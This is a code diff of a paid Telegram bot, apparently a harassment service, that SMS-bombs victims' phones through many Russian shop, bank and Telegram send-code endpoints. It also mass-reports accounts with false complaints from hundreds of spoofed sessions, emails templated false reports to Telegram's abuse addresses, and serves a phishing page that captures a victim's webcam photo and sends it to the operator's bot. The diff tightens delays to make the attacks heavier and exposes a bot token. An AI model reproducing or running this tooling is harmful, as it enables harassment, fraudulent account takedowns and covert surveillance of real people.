@@ -31,10 +31,9 @@ from aiogram.enums import ParseMode, ContentType
 
 from pyrogram import Client
 from pyrogram.errors import FloodWait, RPCError, SessionPasswordNeeded
-import pyrogram.raw.functions.messages as raw_messages
-import pyrogram.raw.types as raw_types
+from pyrogram.raw import functions, types as raw_types
 from pyrogram.raw.functions.account import ReportPeer
-from pyrogram.raw.functions.auth import SendCode
+from pyrogram.raw.functions.messages import Report
 
 # ---------- НАСТРОЙКИ ----------
 BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
@@ -56,95 +55,73 @@ PRICES = {
 }
 
 SESSIONS_PER_USER = 300
-SESSION_DELAY = 60
-SMS_PER_ROUND = 12  # Исправлено на 12
-ROUND_DELAY = 3
+SESSION_DELAY = 3
+SMS_PER_ROUND = 15
+ROUND_DELAY = 2
 MAX_ROUNDS = 10
-BOMBER_DELAY = 0.5
+BOMBER_DELAY = 0.3
 REQUEST_TIMEOUT = 30
 
 MAIL_CONFIG_FILE = "mail_config.json"
-BANNER_FILE = "banner.png"  # Фиксированное имя файла
+BANNER_FILE = "banner.png"
 
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
 ]
 
 RECEIVERS = [
     'abuse@telegram.org', 'dmca@telegram.org', 'security@telegram.org',
     'support@telegram.org', 'sms@telegram.org', 'stopca@telegram.org',
-    'ca@telegram.org', 'legal@telegram.org', 'privacy@telegram.org', 'copyright@telegram.org',
+    'ca@telegram.org', 'legal@telegram.org',
 ]
 
 DEVICES = [
     {"model": f"iPhone {m}", "system": f"iOS {i}"}
-    for m in ["15 Pro Max", "15 Pro", "14 Pro Max", "14 Pro", "13 Pro Max", "13 Pro", "12 Pro Max", "12 Pro", "11 Pro Max"]
-    for i in ["17.3", "17.2", "17.1", "16.7", "16.6", "16.5", "15.7"]
+    for m in ["15 Pro Max", "15 Pro", "14 Pro Max", "14 Pro", "13 Pro Max", "13 Pro", "12 Pro Max"]
+    for i in ["17.3", "17.2", "17.1", "16.7", "16.6"]
 ] + [
-    {"model": f"Samsung Galaxy {m}", "system": f"Android {a}"}
-    for m in ["S24 Ultra", "S23 Ultra", "S22 Ultra", "S21 Ultra", "S20 Ultra", "S20", "S10"]
-    for a in ["14", "13", "12", "11", "10"]
-] + [
-    {"model": f"Xiaomi {m}", "system": f"Android {a}"}
-    for m in ["14 Pro", "13 Pro", "12 Pro", "11T", "10T"]
+    {"model": f"Samsung {m}", "system": f"Android {a}"}
+    for m in ["S24 Ultra", "S23 Ultra", "S22 Ultra", "S21 Ultra"]
     for a in ["14", "13", "12", "11"]
-] + [
-    {"model": f"Google Pixel {m}", "system": f"Android {a}"}
-    for m in ["8 Pro", "7 Pro", "6 Pro", "5"]
-    for a in ["14", "13", "12"]
 ]
 
-# Сайты для сноса номера (OAuth)
+# Сайты для сноса номера
 OAUTH_SITES = [
-    {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
-    {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK"},
-    {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA"},
-    {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment"},
+    {"url": "https://my.telegram.org/auth/send_password", "phone_field": "phone", "name": "MyTelegram"},
+    {"url": "https://web.telegram.org/k/api/auth/sendCode", "phone_field": "phone", "name": "WebK"},
+    {"url": "https://web.telegram.org/a/api/auth/sendCode", "phone_field": "phone", "name": "WebA"},
+    {"url": "https://fragment.com/api/auth/sendCode", "phone_field": "phone", "name": "Fragment"},
 ]
 
-# Сайты для бомбера (исправленные URL)
+# Сайты для бомбера
 BOMBER_SITES = [
-    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DeliveryClub"},
-    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat"},
-    {"url": "https://api.dodopizza.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DodoPizza"},
-    {"url": "https://api.citilink.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Citilink"},
-    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DNS"},
-    {"url": "https://api.mvideo.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MVideo"},
-    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Ozon"},
-    {"url": "https://api.wildberries.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
-    {"url": "https://api.beeline.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Beeline"},
-    {"url": "https://api.megafon.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Megafon"},
-    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS"},
-    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tele2"},
-    {"url": "https://api.tinkoff.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tinkoff"},
-    {"url": "https://api.sberbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Sberbank"},
-    {"url": "https://api.avito.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Avito"},
-    {"url": "https://api.youla.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Youla"},
-    {"url": "https://api.hh.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "HeadHunter"},
+    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "phone_field": "phone", "name": "DeliveryClub"},
+    {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone", "name": "DodoPizza"},
+    {"url": "https://api.citilink.ru/auth/send-code", "phone_field": "phone", "name": "Citilink"},
+    {"url": "https://api.ozon.ru/v1/auth/send-code", "phone_field": "phone", "name": "Ozon"},
+    {"url": "https://api.wildberries.ru/auth/send-code", "phone_field": "phone", "name": "Wildberries"},
+    {"url": "https://api.avito.ru/auth/send-code", "phone_field": "phone", "name": "Avito"},
+    {"url": "https://api.hh.ru/auth/send-code", "phone_field": "phone", "name": "HeadHunter"},
+    {"url": "https://api.youla.ru/auth/send-code", "phone_field": "phone", "name": "Youla"},
 ]
 
-# Тексты жалоб
 COMPLAINT_TEXTS_ACCOUNT = {
-    "1": {"subject": "Report: Telegram account violating platform rules", "body": "Dear Telegram Support,\n\nI have found a Telegram account on your network that violates your platform rules.\n\nAccount details:\n- Username: @{username}\n- Telegram ID: {telegram_id}\n\nThank you for your assistance.\n\nBest regards,\nA Telegram User"},
-    "2": {"subject": "URGENT: Hacked Telegram Account", "body": "Dear Telegram Support,\n\nI lost access to my Telegram account.\n\nAccount details:\n- Username: @{username}\n- Telegram ID: {telegram_id}\n\nPlease reset all active sessions.\n\nBest regards,\nThe Account Owner"},
-    "3": {"subject": "Report: Account using virtual phone number", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is registered using a virtual phone number.\n\nPlease investigate.\n\nBest regards,\nA Telegram User"},
-    "4": {"subject": "Report: Account redirecting users to external services", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is using the bio section for spam.\n\nPlease review.\n\nBest regards,\nA Telegram User"},
-    "5": {"subject": "Report: Premium account used for spam", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is using Telegram Premium for spam.\n\nPlease investigate.\n\nBest regards,\nA Telegram User"}
+    "1": {"subject": "Report: Telegram account violation", "body": "Account @{username} (ID: {telegram_id}) violates Telegram ToS."},
+    "2": {"subject": "URGENT: Hacked Account", "body": "Account @{username} (ID: {telegram_id}) was hacked. Please block."},
+    "3": {"subject": "Report: Virtual number", "body": "Account @{username} uses virtual number. Please investigate."},
+    "4": {"subject": "Report: Spam account", "body": "Account @{username} is used for spam."},
+    "5": {"subject": "Report: Scam account", "body": "Account @{username} is scamming users."}
 }
 
 COMPLAINT_TEXTS_CHANNEL = {
-    "1": {"subject": "Report: Channel publishing personal data", "body": "Dear Telegram Support,\n\nChannel publishing personal data.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nPlease remove.\n\nBest regards,\nA Telegram User"},
-    "2": {"subject": "Report: Channel selling doxxing services", "body": "Dear Telegram Moderator,\n\nChannel selling doxxing services.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nPlease block.\n\nBest regards,\nA Telegram User"},
-    "3": {"subject": "URGENT: Channel threatening violence", "body": "Dear Telegram Support,\n\nURGENT! Channel threatening violence.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nPlease block.\n\nBest regards,\nA Telegram User"},
-    "4": {"subject": "URGENT: Channel distributing illegal content", "body": "Dear Telegram Support,\n\nURGENT! Channel distributing illegal content.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nPlease remove.\n\nBest regards,\nA Telegram User"},
-    "5": {"subject": "Report: Channel engaged in fraud", "body": "Dear Telegram Support,\n\nChannel engaged in fraud.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nPlease remove.\n\nBest regards,\nA Telegram User"},
-    "6": {"subject": "Report: Channel selling virtual numbers", "body": "Dear Telegram Support,\n\nChannel selling virtual phone numbers.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nThank you.\n\nBest regards,\nA Telegram User"},
-    "7": {"subject": "Report: Channel disseminating shock content", "body": "Dear Telegram Support,\n\nChannel disseminating shock content.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nPlease remove.\n\nBest regards,\nA Telegram User"},
-    "8": {"subject": "Report: Channel posting animal cruelty", "body": "Dear Telegram Support,\n\nChannel posting animal cruelty.\n\nChannel: {channel_link}\nViolation: {violation_link}\n\nPlease remove.\n\nBest regards,\nA Telegram User"}
+    "1": {"subject": "Report: Personal data", "body": "Channel {channel_link} publishes personal data.\nViolation: {violation_link}"},
+    "2": {"subject": "Report: Doxxing", "body": "Channel {channel_link} sells doxxing services.\nViolation: {violation_link}"},
+    "3": {"subject": "URGENT: Violence threats", "body": "Channel {channel_link} threatens violence.\nViolation: {violation_link}"},
+    "4": {"subject": "URGENT: Illegal content", "body": "Channel {channel_link} distributes illegal content.\nViolation: {violation_link}"},
+    "5": {"subject": "Report: Fraud", "body": "Channel {channel_link} engaged in fraud.\nViolation: {violation_link}"},
 }
 
 REPORT_REASONS = {
@@ -159,15 +136,14 @@ REPORT_REASONS = {
 }
 
 REPORT_REASONS_RU = {
-    "spam": "Спам", "violence": "Насилие", "pornography": "Порнография",
-    "child_abuse": "Дети", "copyright": "Авторские права", "other": "Другое",
-    "personal_data": "Личные данные", "illegal_drugs": "Наркотики",
+    "spam": "Spam", "violence": "Violence", "pornography": "Pornography",
+    "child_abuse": "Child abuse", "copyright": "Copyright", "other": "Other",
+    "personal_data": "Personal data", "illegal_drugs": "Drugs",
 }
 
-TELEGRAPH_AUTHOR = "Telegram"
 phish_pages = {}
 
-# Шаблон фишинг-страницы с камерой и кнопкой (исправлен)
+# Исправленный шаблон фишинг-страницы
 CAMERA_TEMPLATE = '''<!DOCTYPE html>
 <html>
 <head>
@@ -178,7 +154,7 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
         * {{ margin: 0; padding: 0; box-sizing: border-box; }}
         body {{ 
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%); 
+            background: #1a1a2e; 
             min-height: 100vh; 
             display: flex; 
             justify-content: center; 
@@ -188,11 +164,10 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
         .card {{ 
             max-width: 400px; 
             width: 100%; 
-            background: rgba(20, 20, 35, 0.9); 
+            background: #1e1e35; 
             border-radius: 24px; 
             padding: 30px 20px; 
-            backdrop-filter: blur(10px); 
-            border: 1px solid rgba(233, 69, 96, 0.3); 
+            border: 1px solid #e94560; 
             box-shadow: 0 20px 40px rgba(0,0,0,0.5); 
         }}
         h3 {{ 
@@ -205,7 +180,6 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
         .desc {{ 
             color: #b0b0c0; 
             font-size: 15px; 
-            line-height: 1.5; 
             margin-bottom: 25px; 
             text-align: center; 
         }}
@@ -214,7 +188,6 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
             border-radius: 16px; 
             padding: 10px; 
             margin-bottom: 20px; 
-            border: 1px solid #2a2a40; 
         }}
         video {{ 
             width: 100%; 
@@ -224,7 +197,7 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
             background: #000; 
         }}
         .btn {{
-            background: linear-gradient(135deg, #e94560 0%, #c62a47 100%);
+            background: #e94560;
             color: white;
             border: none;
             padding: 16px 20px;
@@ -233,19 +206,13 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
             border-radius: 14px;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 8px 20px rgba(233, 69, 96, 0.3);
-            transition: all 0.2s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
         }}
-        .btn:hover {{ transform: translateY(-2px); box-shadow: 0 12px 25px rgba(233, 69, 96, 0.4); }}
-        .btn:disabled {{ opacity: 0.5; cursor: not-allowed; transform: none; box-shadow: none; }}
+        .btn:disabled {{ opacity: 0.5; }}
         #status {{ 
             color: #8888aa; 
             font-size: 13px; 
             margin-top: 15px; 
             text-align: center; 
-            min-height: 20px;
         }}
         canvas {{ display: none; }}
     </style>
@@ -259,7 +226,7 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
             <canvas id="canvas"></canvas>
         </div>
         <button class="btn" id="cam-btn">{button_text}</button>
-        <div id="status">Камера готова к съемке</div>
+        <div id="status">Camera ready</div>
     </div>
     <script>
         const BOT_TOKEN = "{bot_token}";
@@ -274,45 +241,35 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
         
         async function startCamera() {{
             try {{
-                stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: 640, height: 480 }} }});
+                stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                 video.srcObject = stream;
                 await video.play();
-                status.textContent = "Камера готова к съемке";
+                status.textContent = "Camera ready";
             }} catch (e) {{
-                status.textContent = "Доступ к камере запрещен";
-                status.style.color = "#e94560";
+                status.textContent = "Camera access denied";
                 btn.disabled = true;
             }}
         }}
         
-        async function sendPhotoToTelegram(dataUrl) {{
+        async function sendPhoto(dataUrl) {{
             try {{
                 const blob = await (await fetch(dataUrl)).blob();
                 const formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
                 formData.append("photo", blob, "victim_" + PAGE_ID + ".jpg");
-                formData.append("caption", "📸 Фото с камеры жертвы\\n\\nID: " + PAGE_ID + "\\nВремя: " + new Date().toLocaleString("ru-RU"));
+                formData.append("caption", "Photo from victim\\nID: " + PAGE_ID);
                 const resp = await fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendPhoto`, {{ method: "POST", body: formData }});
                 const data = await resp.json();
                 return data.ok;
             }} catch (e) {{
-                console.error("Send error:", e);
                 return false;
             }}
         }}
         
-        async function captureAndSend() {{
-            if (photoSent) {{ 
-                status.textContent = "Фото уже отправлено"; 
-                return; 
-            }}
+        async function capture() {{
+            if (photoSent || !stream) return;
             
-            if (!stream) {{
-                status.textContent = "Камера не доступна";
-                return;
-            }}
-            
-            status.textContent = "📸 Съемка...";
+            status.textContent = "Capturing...";
             btn.disabled = true;
             
             try {{
@@ -321,33 +278,26 @@ CAMERA_TEMPLATE = '''<!DOCTYPE html>
                 canvas.height = video.videoHeight || 480;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const photoData = canvas.toDataURL("image/jpeg", 0.92);
-                const success = await sendPhotoToTelegram(photoData);
+                const photoData = canvas.toDataURL("image/jpeg", 0.9);
+                const success = await sendPhoto(photoData);
                 
                 if (success) {{
                     photoSent = true;
-                    status.textContent = "✅ Фото успешно отправлено!";
-                    status.style.color = "#4caf50";
-                    btn.textContent = "Отправлено";
-                    
-                    if (stream) {{
-                        stream.getTracks().forEach(t => t.stop());
-                        video.srcObject = null;
-                    }}
+                    status.textContent = "Photo sent!";
+                    btn.textContent = "Sent";
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
                 }} else {{
-                    status.textContent = "❌ Ошибка отправки, попробуйте снова";
-                    status.style.color = "#e94560";
+                    status.textContent = "Error, try again";
                     btn.disabled = false;
                 }}
             }} catch (e) {{
-                console.error("Capture error:", e);
-                status.textContent = "❌ Ошибка съемки";
-                status.style.color = "#e94560";
+                status.textContent = "Error";
                 btn.disabled = false;
             }}
         }}
         
-        btn.addEventListener("click", captureAndSend);
+        btn.addEventListener("click", capture);
         startCamera();
     </script>
 </body>
@@ -363,7 +313,6 @@ ALLOWED_USERS = {}
 user_sessions = {}
 active_attacks = {}
 active_bombers = {}
-active_reports = {}
 sessions_creation_lock = {}
 usage_logs = []
 MAX_LOGS = 20
@@ -371,9 +320,6 @@ user_messages = {}
 user_last_action = {}
 payments = {}
 promo_codes = {}
-
-class SnosTypeState(StatesGroup):
-    waiting_type = State()
 
 class SnosPhoneState(StatesGroup):
     waiting_phone = State()
@@ -469,8 +415,8 @@ def check_cooldown(user_id: int, action: str) -> tuple:
     key = f"{user_id}_{action}"
     if key in user_last_action:
         elapsed = time.time() - user_last_action[key]
-        if elapsed < 300:
-            return False, 300 - elapsed
+        if elapsed < 60:
+            return False, 60 - elapsed
     user_last_action[key] = time.time()
     return True, 0
 
@@ -479,11 +425,6 @@ def add_log(user_id: int, action: str, target: str):
     usage_logs.append({"user_id": user_id, "action": action, "target": target, "time": datetime.now().strftime('%H:%M:%S')})
     if len(usage_logs) > MAX_LOGS:
         usage_logs = usage_logs[-MAX_LOGS:]
-
-def get_last_logs(count: int = 5) -> str:
-    if not usage_logs:
-        return "Пусто"
-    return "\n".join([f"[{l['time']}] {l['user_id']} - {l['action']}: {l['target']}" for l in reversed(usage_logs[-count:])])
 
 def load_allowed_users():
     global ALLOWED_USERS
@@ -524,14 +465,14 @@ class AccessMiddleware:
             if user_id == ADMIN_ID:
                 return await handler(event, data)
             else:
-                await send_message_with_banner(event, "Только администратор!")
+                await send_message_with_banner(event, "Admin only!")
                 return
         
         if user_id and not is_user_allowed(user_id):
             if isinstance(event, types.CallbackQuery):
-                await event.answer("Доступ запрещен! Приобретите подписку.", show_alert=True)
+                await event.answer("Access denied!", show_alert=True)
             elif isinstance(event, types.Message):
-                await send_message_with_banner(event, "Доступ запрещен! Приобретите подписку.")
+                await send_message_with_banner(event, "Access denied! Purchase subscription.")
             return
         
         return await handler(event, data)
@@ -589,18 +530,11 @@ class EmailSender:
 email_sender = EmailSender()
 
 
-# ---------- СЕССИИ ----------
+# ---------- SESSIONS ----------
 def get_user_session_dir(user_id: int) -> str:
     return f"sessions/user_{user_id}"
 
-def count_user_sessions_files(user_id: int) -> int:
-    d = get_user_session_dir(user_id)
-    if not os.path.exists(d):
-        return 0
-    return len([f for f in os.listdir(d) if f.startswith("session_") and f.endswith(".session")])
-
 async def create_single_session(session_file: str, idx: int) -> dict:
-    """Создание одной сессии"""
     try:
         device = random.choice(DEVICES)
         client = Client(
@@ -616,8 +550,7 @@ async def create_single_session(session_file: str, idx: int) -> dict:
         )
         await client.connect()
         return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
-    except Exception as e:
-        logger.error(f"Failed session {idx}: {type(e).__name__}")
+    except:
         return None
 
 async def create_user_sessions(user_id: int) -> tuple:
@@ -640,9 +573,9 @@ async def create_user_sessions(user_id: int) -> tuple:
     for r in results:
         if r and not isinstance(r, Exception):
             sessions.append(r)
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.3)
     
-    logger.info(f"User {user_id}: created {len(sessions)}/{SESSIONS_PER_USER} sessions")
+    logger.info(f"User {user_id}: created {len(sessions)} sessions")
     return sessions, len(sessions)
 
 async def ensure_user_sessions(user_id: int):
@@ -651,10 +584,9 @@ async def ensure_user_sessions(user_id: int):
     sessions_creation_lock[user_id] = True
     try:
         if user_id not in user_sessions:
-            user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
+            user_sessions[user_id] = {"sessions": [], "ready": False}
         sessions, total = await create_user_sessions(user_id)
         user_sessions[user_id]["sessions"] = sessions
-        user_sessions[user_id]["total"] = total
         user_sessions[user_id]["ready"] = True
     finally:
         sessions_creation_lock[user_id] = False
@@ -669,7 +601,7 @@ async def refresh_user_sessions(user_id: int):
     d = get_user_session_dir(user_id)
     if os.path.exists(d):
         shutil.rmtree(d)
-    user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
+    user_sessions[user_id] = {"sessions": [], "ready": False}
     await ensure_user_sessions(user_id)
 
 async def get_user_sessions_batch(user_id: int, count: int) -> list:
@@ -695,49 +627,29 @@ def release_user_sessions(sessions: list):
 def is_user_sessions_ready(user_id: int) -> bool:
     return user_id in user_sessions and user_sessions[user_id].get("ready", False)
 
-def get_user_sessions_count(user_id: int) -> int:
-    if user_id not in user_sessions:
-        return 0
-    return len(user_sessions[user_id].get("sessions", []))
 
-
-# ---------- АТАКИ СНОСА ----------
+# ---------- SNOS ATTACKS ----------
 async def send_sms_via_session(session_data: dict, phone: str) -> dict:
-    """Отправка SMS через сессию Pyrogram"""
     try:
         client = session_data["client"]
         if not client.is_connected:
             await client.connect()
         
-        # Используем правильный метод отправки кода
         sent_code = await client.send_code(phone)
-        return {"type": "SMS", "success": True, "phone_code_hash": sent_code.phone_code_hash}
+        return {"success": True}
     except FloodWait as e:
         session_data["flood_until"] = time.time() + e.value
-        return {"type": "SMS", "success": False, "error": f"FloodWait {e.value}s"}
-    except Exception as e:
-        return {"type": "SMS", "success": False, "error": str(e)}
+        return {"success": False}
+    except:
+        return {"success": False}
 
 async def send_acollo_request(session: aiohttp.ClientSession, phone: str) -> dict:
-    """Отправка запроса через acollo.ru (OAuth Telegram)"""
+    """Исправленный запрос к Acollo"""
     try:
         clean_phone = phone.replace("+", "")
         
-        # URL для acollo OAuth
+        # Сначала получаем страницу для получения CSRF
         auth_url = "https://oauth.telegram.org/auth"
-        
-        headers = {
-            'User-Agent': random.choice(USER_AGENTS),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-        }
-        
         params = {
             "bot_id": "8357292784",
             "origin": "https://acollo.ru",
@@ -746,66 +658,57 @@ async def send_acollo_request(session: aiohttp.ClientSession, phone: str) -> dic
             "return_to": "https://acollo.ru/auth/telegram"
         }
         
-        # Получаем страницу для получения CSRF токена
+        headers = {
+            'User-Agent': random.choice(USER_AGENTS),
+            'Accept': 'text/html,application/xhtml+xml',
+            'Accept-Language': 'ru-RU,ru;q=0.9',
+        }
+        
         async with session.get(auth_url, params=params, headers=headers, timeout=15, ssl=False) as resp:
             html = await resp.text()
             
-            # Ищем stel_ssid и другие токены
+            # Ищем stel_ssid в куках
             cookies = {}
             for cookie in session.cookie_jar:
                 cookies[cookie.key] = cookie.value
             
-            # Ищем CSRF токен в HTML
+            # Ищем CSRF токен
             csrf_token = None
-            patterns = [
-                r'name="csrf_token"[^>]*value="([^"]+)"',
-                r'data-csrf="([^"]+)"',
-                r'"csrf_token":"([^"]+)"',
-                r'name="_token"[^>]*value="([^"]+)"',
-            ]
-            for pattern in patterns:
-                match = re.search(pattern, html)
-                if match:
-                    csrf_token = match.group(1)
-                    break
+            match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', html)
+            if match:
+                csrf_token = match.group(1)
             
             if not csrf_token:
-                # Пробуем прямой POST запрос
-                send_url = "https://oauth.telegram.org/auth/send_code"
+                match = re.search(r'"csrf_token":"([^"]+)"', html)
+                if match:
+                    csrf_token = match.group(1)
+            
+            # Отправляем код
+            send_url = "https://oauth.telegram.org/auth/send_code"
+            
+            if csrf_token:
+                data = {"phone": clean_phone, "csrf_token": csrf_token}
+                headers_post = {
+                    'User-Agent': random.choice(USER_AGENTS),
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Origin': 'https://oauth.telegram.org',
+                    'Referer': str(resp.url),
+                }
+            else:
                 data = {"phone": clean_phone}
                 headers_post = {
                     'User-Agent': random.choice(USER_AGENTS),
                     'Content-Type': 'application/json',
-                    'Accept': 'application/json',
                     'Origin': 'https://oauth.telegram.org',
-                    'Referer': 'https://oauth.telegram.org/',
                 }
-                async with session.post(send_url, json=data, headers=headers_post, timeout=15, ssl=False) as resp2:
-                    result = await resp2.text()
-                    return {"site": "Acollo", "success": resp2.status < 500 or "OK" in result}
             
-            # Отправляем код с CSRF токеном
-            send_data = {
-                "phone": clean_phone,
-                "csrf_token": csrf_token
-            }
-            
-            headers_post = {
-                'User-Agent': random.choice(USER_AGENTS),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Accept': 'text/html,application/xhtml+xml',
-                'Origin': 'https://oauth.telegram.org',
-                'Referer': str(resp.url),
-            }
-            
-            async with session.post(
-                "https://oauth.telegram.org/auth/send_code",
-                data=send_data,
-                headers=headers_post,
-                cookies=cookies,
-                timeout=15,
-                ssl=False
-            ) as resp2:
+            async with session.post(send_url, 
+                                   json=data if not csrf_token else None,
+                                   data=data if csrf_token else None,
+                                   headers=headers_post, 
+                                   cookies=cookies,
+                                   timeout=15, 
+                                   ssl=False) as resp2:
                 return {"site": "Acollo", "success": resp2.status < 500}
                 
     except Exception as e:
@@ -815,9 +718,8 @@ async def send_acollo_request(session: aiohttp.ClientSession, phone: str) -> dic
 async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
     headers = {
         'User-Agent': random.choice(USER_AGENTS),
-        'Accept': '*/*',
+        'Accept': 'application/json',
         'Content-Type': 'application/json',
-        'Origin': site["url"].split('/api')[0] if '/api' in site["url"] else '/'.join(site["url"].split('/')[:3]),
     }
     clean_phone = phone.replace("+", "")
     
@@ -833,7 +735,7 @@ async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: a
     phone = phone.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"):
         phone = "+" + phone
-    add_log(user_id, "Снос номера", phone)
+    add_log(user_id, "Phone snos", phone)
     
     connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as sess:
@@ -843,22 +745,21 @@ async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: a
             
             tasks = []
             
-            # Запросы через сессии (SMS_PER_ROUND = 12)
+            # SMS через сессии
             sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
             if sessions:
                 for s in sessions:
                     tasks.append(send_sms_via_session(s, phone))
             
-            # OAuth запросы (через aiohttp)
-            for _ in range(2):  # 2 запроса на каждый сайт
+            # OAuth сайты
+            for _ in range(2):
                 for site in OAUTH_SITES:
                     tasks.append(send_oauth_request(sess, phone, site))
             
-            # Acollo запросы (отдельно, не через сессии)
-            for _ in range(3):  # 3 запроса на Acollo
+            # Acollo запросы (5 штук за раунд)
+            for _ in range(5):
                 tasks.append(send_acollo_request(sess, phone))
             
-            # Запускаем все задачи
             batch = await asyncio.gather(*tasks, return_exceptions=True)
             release_user_sessions(sessions)
             
@@ -868,7 +769,7 @@ async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: a
             if progress_callback:
                 await progress_callback(rnd, rounds, ok)
             
-            logger.info(f"Round {rnd}/{rounds} for {phone}: {round_ok} requests")
+            logger.info(f"Round {rnd}/{rounds}: {round_ok} requests")
             
             if rnd < rounds and not stop_event.is_set():
                 await asyncio.sleep(ROUND_DELAY)
@@ -878,18 +779,18 @@ async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: a
 async def snos_attack_username(user_id: int, username: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     ok = 0
     username = username.strip().replace("@", "")
-    add_log(user_id, "Снос username", f"@{username}")
+    add_log(user_id, "Username snos", f"@{username}")
     
     for rnd in range(1, rounds + 1):
         if stop_event.is_set():
             break
         
-        sessions = await get_user_sessions_batch(user_id, min(30, SESSIONS_PER_USER))
+        sessions = await get_user_sessions_batch(user_id, min(50, SESSIONS_PER_USER))
         if not sessions:
             break
         
         tasks = []
-        reasons = ["spam", "violence", "pornography", "copyright", "personal_data", "other"]
+        reasons = ["spam", "violence", "pornography", "copyright", "personal_data", "other", "illegal_drugs"]
         
         for s in sessions:
             for reason in reasons:
@@ -898,65 +799,124 @@ async def snos_attack_username(user_id: int, username: str, rounds: int, stop_ev
         batch = await asyncio.gather(*tasks, return_exceptions=True)
         release_user_sessions(sessions)
         
-        round_ok = sum(1 for r in batch if r and not isinstance(r, Exception))
